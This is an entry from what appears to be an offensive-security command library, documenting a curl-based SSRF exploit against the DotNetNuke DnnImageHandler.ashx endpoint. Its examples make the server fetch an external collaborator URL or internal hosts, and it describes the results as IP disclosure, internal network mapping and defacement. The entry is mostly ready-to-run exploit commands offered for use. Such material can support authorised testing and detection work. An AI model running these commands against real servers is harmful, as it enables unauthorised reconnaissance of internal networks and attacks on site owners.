---
id: cmd-uuid-002
data: >-
  curl -v
  "https://target-site.com/DnnImageHandler.ashx?mode=file&url=<arbitrary-url>"
tags:
  - ssrf
  - web
  - exploit
  - recon
type: command
output: |-
  HTTP/1.1 200 OK
  <response based on arbitrary URL>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.293Z'
verified: false
validated: true
submitted: true
---
# curl-dnn-ssrf

## Command

```bash
curl -v "https://target-site.com/DnnImageHandler.ashx?mode=file&url=<arbitrary-url>"
```

## Description

This command triggers SSRF by supplying an arbitrary URL (external collaborator, internal NIPR, or malicious image) to the DNN ImageHandler, enabling IP disclosure, network mapping, or defacement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode for debugging | Yes |
| `https://target-site.com/DnnImageHandler.ashx` | Vulnerable endpoint | Yes |
| `?mode=file&url=` | SSRF-triggering parameters | Yes |
| `<arbitrary-url>` | External/internal/malicious URL (e.g., collaborator.oastify.com or internal-nipr-site/logo.png) | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://target-site.com/DnnImageHandler.ashx?mode=file&url=https://collaborator.oastify.com/test.png"
```

### Advanced Usage

```bash
curl -v "https://target-site.com/DnnImageHandler.ashx?mode=file&url=http://internal-site/logo.png" -o internal-image.jpg
```

## Expected Output

Server fetches the URL; output includes the resource (image/error) or 200 OK. Monitor external server for callbacks confirming SSRF.

## Related

- [[Related Procedure|procedures/Exploit-DNN-ImageHandler-SSRF]]
